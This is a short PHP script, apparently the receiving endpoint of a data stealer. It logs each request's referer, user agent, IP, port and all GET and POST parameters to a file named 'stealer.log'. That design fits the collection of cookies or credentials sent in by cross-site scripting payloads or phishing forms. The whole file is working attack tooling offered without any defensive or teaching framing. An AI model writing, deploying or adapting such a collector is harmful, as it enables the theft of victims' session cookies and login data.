<?php

function get_dump($mixed) {
	ob_start();
	var_dump($mixed);
	$content = ob_get_contents();
	ob_end_clean();
	return $content;
}

function getIP() {
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
		$ip = getenv("HTTP_CLIENT_IP");
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
		$ip = getenv("HTTP_X_FORWARDED_FOR");
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
		$ip = getenv("REMOTE_ADDR");
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
		$ip = $_SERVER['REMOTE_ADDR'];
	else
		$ip = "unknown";
	return($ip);
}

// get datas
$str = time() . " " . date("Y-m-d H:i:s") . "\n";

$str .= "Header:" . "\n";
$str .= " Referer: " . $_SERVER["HTTP_REFERER"] . "\n";
$str .= " User-agent: " . $_SERVER["HTTP_USER_AGENT"] . "\n";
$str .= " IP: " . getIP() . "\n";
$str .= " Port: " . $_SERVER["REMOTE_PORT"] . "\n";

$str .= "GET: " . get_dump($_GET) . "\n";
$str .= "POST: " . get_dump($_POST) . "\n";


$str .= "-------------------------------------\n";

// save datas
$log = fopen("stealer.log", "a");
fwrite($log, $str);
fclose($log);

?>
